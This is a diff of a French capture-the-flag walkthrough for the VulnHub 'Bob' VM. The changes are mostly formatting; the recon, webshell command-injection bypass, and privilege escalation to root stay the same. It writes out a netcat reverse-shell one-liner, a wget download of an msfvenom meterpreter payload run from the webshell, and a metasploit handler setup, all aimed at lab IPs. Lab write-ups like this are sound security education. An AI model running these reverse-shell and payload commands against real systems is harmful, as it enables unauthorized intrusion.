@@ -1,6 +1,6 @@
 # Bob: 1.0.1
 
-[Bob: 1.0.1](https://www.vulnhub.com/entry/bob-101,226/) est une machine virtuelle vulnérable conçue par [c0rruptedb1t](https://www.vulnhub.com/author/c0rruptedb1t,578/). L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
+[Bob: 1.0.1](https://www.vulnhub.com/entry/bob-101,226/) est une machine virtuelle vulnérable, conçue par [c0rruptedb1t](https://www.vulnhub.com/author/c0rruptedb1t,578/) et publiée sur VulnHub au mois de mai 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
 ## Synopsis
 
@@ -8,10 +8,10 @@ _Le lycée Milburg a fait l'objet d'une cyber-attaque, obligeant les responsable
 
 ## Recherche d'informations
 
-Pour commencer, l'outil [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Bob : il s'agit de 192.168.56.103.
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Bob : il s'agit de 192.168.56.103.
 
 ```console
-root@blinils:~/VM_Bob# netdiscover -r 192.168.56.0/24
+root@blinils:~# netdiscover -r 192.168.56.0/24
 
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 
@@ -24,10 +24,10 @@ _____________________________________________________________________________
 192.168.56.103  08:00:27:c0:cc:74      1      60  PCS Systemtechnik GmbH
 ```
 
-Toute phase d'attaque commence par une analyse du système cible. Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi possible de se connecter à distance avec SSH au serveur Bulldog, mais sur un port non-standard : 25468 au lieu de 22 ; un serveur Web Apache 2.4.25 est par ailleurs installé et en écoute sur le port 80.
+Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Il est ainsi possible de se connecter à distance avec SSH au serveur Bulldog, mais sur un port non-standard : 25468 au lieu de 22 ; un serveur Web Apache 2.4.25 est par ailleurs installé et en écoute sur le port 80.
 
 ```console
-root@blinils:~/VM_Bob# nmap -sT -sV -p- -A 192.168.56.103
+root@blinils:~# nmap -sT -sV -p- -A 192.168.56.103
 --snip--
 PORT      STATE SERVICE VERSION
 80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
@@ -48,15 +48,19 @@ OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
 OS details: Linux 3.2 - 4.9
 ```
 
-Il s'agit bien du site Web du lycée avec, en arrière-plan, l'image d'une jolie bibliothèque à plusieurs étages ; les étudiants ont de la chance s'il s'agit de leur CDI. Bien qu'en construction, quelques pages sont accessibles : index.html, news.html, about.html, contact.html et login.html.
+Il s'agit bien du site Web du lycée avec, en arrière-plan, l'image d'une jolie bibliothèque à plusieurs étages ; les étudiants ont de la chance s'il s'agit de leur CDI. Bien qu'en construction, quelques pages sont accessibles : ```index.html```, ```news.html```, ```about.html```, ```contact.html``` et ```login.html```.
 
-On apprend dans les news que le directeur du lycée Dean MacDuffy aime manger des sandwichs jambon-fromage et, accessoirement, qu'il a communiqué auprès de ses étudiants sur la cyber-attaque. La page de contact, quant à elle, liste les coordonnées du principal, des conseillers d'éducation et du département informatique, dans lequel figurent Bob J (admin), Sebastian W (seb), Elliot A (elliot), et Joseph C (jc).
+![Affichage de l'image bob-accueil.png](images/bob-accueil.png)
 
-Ces informations seront peut-être utiles par la suite, gardons-les de côté au cas où. 
+On apprend dans les news que le directeur du lycée Dean MacDuffy aime manger des sandwichs jambon-fromage et, accessoirement, qu'il a communiqué auprès de ses étudiants sur la cyber-attaque. La page de contact, quant à elle, liste les coordonnées du principal, des conseillers d'éducation et du département informatique, dans lequel figurent Bob J (admin), Sebastian W (seb), Elliot A (elliot) et Joseph C (jc).
+
+Ces informations seront peut-être utiles par la suite, gardons-les de côté au cas où.
+
+![Affichage de l'image bob-news.png](images/bob-news.png)
 
 En fouillant un peu dans le code source de chaque page, on y trouve des informations intéressantes.
 
-Ainsi, la page login.html contient en commentaires le message ```<!-- If you are the new IT staff I have sent a letter to you about a web shell you can use -Bob  -->``` tandis que la page news.html contient une chaîne encodée en base64 qui, une fois décodée, devient ```In other news some dumbass made a file called passwords.html, completely braindead -Bob``` ... effectivement, passwords.html est listé dans le fichier robots.txt, voyons voir s'il recèle de précieux sésames... et malheureusement, non, Bob a dû passer par là et enguirlander ses collègues. Ce n'est effectivement pas une bonne idée de stocker ses mots de passe en clair dans un fichier texte, qui plus est accessible sur le serveur Web. Dans le code source, on trouve également le message suivant...
+Ainsi, la page ```login.html``` contient en commentaires le message _```<!-- If you are the new IT staff I have sent a letter to you about a web shell you can use -Bob  -->```_ tandis que la page ```news.html``` contient une chaîne encodée en base64 qui, une fois décodée, devient _```In other news some dumbass made a file called passwords.html, completely braindead -Bob```_ ... effectivement, ```passwords.html``` est listé dans le fichier ```robots.txt```, voyons voir s'il recèle de précieux sésames... et malheureusement, non, Bob a dû passer par là et enguirlander ses collègues. Ce n'est effectivement pas une bonne idée de stocker ses mots de passe en clair dans un fichier texte, qui plus est accessible sur le serveur Web. Dans le code source, on trouve également le message suivant...
 
 ```html
 <!-- N.T.S Get Sticky Notes to Write Passwords in -Bob -->
@@ -71,11 +75,11 @@ security! I have moved the file off the server. Don't make me have to clean up t
 does something as stupid as this. We will have a meeting about this and other stuff I found on the server. >:(
 ```
 
-lat_memo.html contient un autre message de Bob, toujours sur la sécurité du site Web : ```Hey guys IT here don't forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.```
+```lat_memo.html``` contient un autre message de Bob, toujours sur la sécurité du site Web : _```Hey guys IT here don't forget to check your emails regarding the recent security breach. There is a web shell running on the server with no protection but it should be safe as I have ported over the filter from the old windows server to our new linux one. Your email will have the link to the shell.```_
 
 ## À l'assaut du webshell
 
-Hmmmm hmmmmm, voilà qui est délicieux : un webshell est installé sur le serveur Web. Il s'agit d'un script permettant d'interagir avec le serveur et de lui envoyer des commandes. Il y avait déjà un webshell dans l'un des CTF résolus sur ce dépôt, à savoir [bulldog1](/CTF-VulnLabs/bulldog1). Il était alors possible [d'injecter des commandes](https://www.owasp.org/index.php/Command_Injection) et d'une part, d'exfiltrer des données et d'autre part, de se connecter au serveur. Après quelques essais, voici les données qui ont pu être exfiltrées malgré cette protection. 
+Hmmmm hmmmmm, voilà qui est délicieux : un _webshell_ est installé sur le serveur Web. Il s'agit d'un script permettant d'interagir avec le serveur et de lui envoyer des commandes. Il y avait déjà un _webshell_ dans l'un des CTF résolus sur ce dépôt, à savoir [bulldog1](/CTF-VulnLabs/bulldog1). Il était alors possible [d'injecter des commandes](https://www.owasp.org/index.php/Command_Injection) avant d'exfiltrer des données et de se connecter au serveur. Après quelques essais, voici les données qui ont pu être exfiltrées malgré cette protection. 
 
 ```console
 Command : ls
@@ -106,34 +110,7 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-_apt:x:104:65534::/nonexistent:/bin/false
-Debian-exim:x:105:109::/var/spool/exim4:/bin/false
-rtkit:x:106:110:RealtimeKit,,,:/proc:/bin/false
-dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
-avahi-autoipd:x:108:111:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
-messagebus:x:109:112::/var/run/dbus:/bin/false
-usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
-speech-dispatcher:x:111:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
-lightdm:x:112:116:Light Display Manager:/var/lib/lightdm:/bin/false
-pulse:x:113:117:PulseAudio daemon,,,:/var/run/pulse:/bin/false
-avahi:x:114:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
-saned:x:115:121::/var/lib/saned:/bin/false
+--snip--
 c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash
 bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
 jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
@@ -144,18 +121,18 @@ proftpd:x:117:65534::/run/proftpd:/bin/false
 ftp:x:118:65534::/srv/ftp:/bin/false
 ```
 
-Le but du jeu consiste à exécuter des commandes auxquelles nous n'avons normalement pas droit. Généralement, l'exploitation de cette vulnérabilité est réalisée à l'aide d'opérateurs logiques ([_control operators_](https://www.w3resource.com/linux-system-administration/control-operators.php) en anglais) : en effet, il est possible d'enchaîner plusieurs commandes à la suite, et la vérification semble n'être réalisée que sur le premier mot / que sur la première commande fournie. Ainsi, si le point-virgule est interdit, d'autres opérateurs logiques peuvent être utilisés afin de contourner les restrictions du Web-Shell. En outre, le fichier /etc/passwd nous informe que chaque membre du département informatique possède un compte Unix : root, c0rruptedb1t, bob, jc, seb, elliot.
+Le but du jeu consiste à exécuter des commandes auxquelles nous n'avons normalement pas droit. Généralement, l'exploitation de cette vulnérabilité est réalisée à l'aide d'opérateurs logiques ([_control operators_](https://www.w3resource.com/linux-system-administration/control-operators.php) en anglais) : en effet, il est possible d'enchaîner plusieurs commandes à la suite, et la vérification semble n'être réalisée que sur le premier mot / que sur la première commande fournie. Ainsi, si le point-virgule est interdit, d'autres opérateurs logiques peuvent être utilisés afin de contourner les restrictions de ce _Web-Shell_. En outre, le fichier ```/etc/passwd``` nous informe que chaque membre du département informatique possède un compte Unix : root, c0rruptedb1t, bob, jc, seb, elliot.
 
-À présent, il s'agit d'obtenir un shell sur le serveur !
+À présent, il s'agit d'obtenir un véritable accès au serveur !
 
 ## Mise en place d'un reverse shell et accès au serveur Bob
 
-Le reverse shell avec netcat a particulièrement bien fonctionné la première fois.
+Le [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) avec [__netcat__](http://nc110.sourceforge.net/) a particulièrement bien fonctionné la première fois.
 
-```nc -lvp 12345``` sur notre machine, ```ls|nc -e /bin/bash 192.168.56.101 12345``` dans le webshell.
+```nc -lvp 12345``` sur notre machine, ```ls|nc -e /bin/bash 192.168.56.101 12345``` dans le _webshell_.
 
 ```console
-root@blinils:~/VM_Bob# nc -lvp 12345
+root@blinils:~# nc -lvp 12345
 listening on [any] 12345 ...
 192.168.56.103: inverse host lookup failed: Unknown host
 connect to [192.168.56.101] from (UNKNOWN) [192.168.56.103] 45822
@@ -164,7 +141,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data),100(users)
 ```
 
-Cela dit, autant avoir un [meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) sous la main. Le principe est le suivant : un [_reverse shell_](https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/) en Python va être créé et déposé sur le serveur Bob. Ce bout de code va, dans un premier temps, créer une connexion sur le port 4444 entre le serveur du lycée (192.168.56.103) et notre propre machine (192.168.56.101), avant d'envoyer un meterpreter à travers la connexion créée, qui sera exécuté sur le serveur distant.
+Cela dit, autant avoir un [meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/) sous la main. Le principe est le suivant : un _reverse shell_ en Python va être créé et déposé sur le serveur Bob. Ce bout de code va, dans un premier temps, créer une connexion sur le port 4444 entre le serveur du lycée (192.168.56.103) et notre propre machine (192.168.56.101), avant d'envoyer un meterpreter à travers la connexion créée, qui sera exécuté sur le serveur distant.
 
 ```console
 root@blinils:~# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -o shell.py
@@ -178,7 +155,7 @@ root@blinils:~# python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 ```
 
-De retour sur le Web-Shell, le reverse-shell Python est déposé sur le serveur via [wget](https://www.gnu.org/software/wget/).
+De retour sur le _Web-Shell_, le _reverse shell_ Python est déposé sur le serveur via [__wget__](https://www.gnu.org/software/wget/).
 
 ```console
 Command : id && wget http://192.168.56.101:8000/shell.py -O /tmp/shell.py
@@ -194,7 +171,7 @@ Un listener est alors mis en place sur notre machine, afin d'écouter toute conn
 root@blinils:~# service postgresql start
 root@blinils:~# msfdb start
 root@blinils:~# msfconsole
-                                                  
+
 --snip--
 msf > use exploit/multi/handler
 msf exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
@@ -208,7 +185,7 @@ msf exploit(multi/handler) > exploit -j
 [*] Started reverse TCP handler on 192.168.56.101:4444
 ```
 
-De retour une nouvelle fois sur le Web-Shell, le fait de lancer la commande _id && python /tmp/shell.py_ amorce la connexion.
+De retour une nouvelle fois sur le _Web-Shell_, le fait de lancer la commande ```id && python /tmp/shell.py``` amorce la connexion.
 
 ```console 
 msf exploit(multi/handler) > [*] Sending stage (53168 bytes) to 192.168.56.103
@@ -344,7 +321,7 @@ Hello_Again.py	     proftpd-1.3.3c
 Wheel_Of_Fortune.py  wallpaper.wiki-HD-Bobcat-Wallpaper-PIC-WPB0014118.jpg
 ```
 
-staff.txt contient des éléments peu agréables sur chacun des collègues de Bob, et login.txt.gpg est un fichier chiffré : rien à en tirer pour le moment. En revanche, un fichier notes.txt est présent dans le répertoire /home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here et il contient...
+```staff.txt``` contient des éléments peu agréables sur chacun des collègues de Bob, et [```login.txt.gpg```](/files/login.txt.gpg) est un fichier chiffré : rien à en tirer pour le moment. En revanche, un fichier ```notes.txt``` est présent dans le répertoire ```/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here``` et il contient...
 
 ```
 #!/bin/bash
@@ -419,27 +396,27 @@ Rien à signaler du côté de Sebastian W et Joseph C, alors par où continuer ?
 
 ## Un peu de stéganographie dans ce monde de brutes
 
-Une chose est sûre : la clé de la résolution du CTF passe par ce maudit fichier login.txt.gpg, mais aucun des mots de passe trouvés jusqu'à présent ne fonctionne.
+Une chose est sûre : la clé de la résolution du CTF passe par ce maudit fichier ```login.txt.gpg```, mais aucun des mots de passe trouvés jusqu'à présent ne fonctionne.
 
 ```console
-root@blinils:~/VM_Bob# scp -P 25468 -r -p elliot@192.168.56.103:/home/bob/Documents/login.txt.gpg /root/VM_Bob/login.txt.gpg
+root@blinils:~# scp -P 25468 -r -p elliot@192.168.56.103:/home/bob/Documents/login.txt.gpg /root/VM_Bob/login.txt.gpg
 
 elliot@192.168.56.103's password: 
 login.txt.gpg                                 100%   91   190.0KB/s   00:00
 
-root@blinils:~/VM_Bob# ls
-GWUvFch.png  login.txt.gpg  shell.py  users_VM_Bob.txt
+root@blinils:~# ls
+GWUvFch.png  login.txt.gpg  shell.py
 
-root@blinils:~/VM_Bob# gpg --output login.txt --decrypt login.txt.gpg
+root@blinils:~# gpg --output login.txt --decrypt login.txt.gpg
 gpg: AES encrypted data
 gpg: encrypted with 1 passphrase
 gpg: decryption failed: Bad session key
 ```
 
-La clé doit forcément être sous nos yeux, ou alors extrêmement bien cachée dans un sombre recoin du serveur. Après plusieurs sessions à essayer dix mille trucs, entrecoupées de balades en rollers pour évacuer ma frustration grandissante, j'ai finalement trouvé la passphrase : elle était effectivement bien cachée dans le seul fichier encore non exploité, le fichier notes.txt de Bob.
+La clé doit forcément être sous nos yeux, ou alors extrêmement bien cachée dans un sombre recoin du serveur. Après plusieurs sessions à essayer dix mille trucs, entrecoupées de balades en rollers pour évacuer ma frustration grandissante, j'ai finalement trouvé la passphrase : elle était effectivement bien cachée dans le seul fichier encore non exploité, le fichier ```notes.txt``` de Bob.
 
 (ノ°Д°）ノ︵ ┻━┻
 
-[mode rage=on] grrrr on prend la première lettre de chaque note et ça donne HARPOCRATES, cool c'est le nom d'une divinité égyptienne et super après avoir testé plein de trucs, c'est la bonne passphrase pour ouvrir le fichier login.txt.gpg, du coup on récupère le fichier login.txt qui contient les credentials de bob puis on se connecte sur le serveur en tant que bob, et comme il a un max de droits car c'est pas la personne la plus fute-fute du staff dixit le fichier /etc/passwd, on passe root sur le serveur avec la commande "sudo su -" et hop on affiche le contenu du fichier /root/flag.txt et c'est gagné, fin du walkthrough. [mode rage=off]
+[mode rage=on] grrrr on prend la première lettre de chaque note et ça donne ```HARPOCRATES``` cool c'est le nom d'une divinité égyptienne et super après avoir testé plein de trucs, c'est la bonne passphrase pour ouvrir le fichier ```login.txt.gpg```, du coup on récupère le fichier ```login.txt``` qui contient les credentials de bob puis on se connecte sur le serveur en tant que bob, et comme il a un max de droits car c'est pas la personne la plus fute-fute du staff dixit le fichier ```/etc/passwd```, on passe root sur le serveur avec la commande ```sudo su -``` et hop on affiche le contenu du fichier ```/root/flag.txt``` et c'est gagné, fin du _walkthrough_. [mode rage=off]
 
-Il m'en a fallu du temps pour trouver la passphrase, mais le jeu en valait la chandelle. Merci à c0rruptedb1t pour cette VM !
+Il m'en a fallu du temps pour trouver la passphrase, mais le jeu en valait la chandelle. Merci à [c0rruptedb1t](https://www.vulnhub.com/author/c0rruptedb1t,578/) pour cette VM !
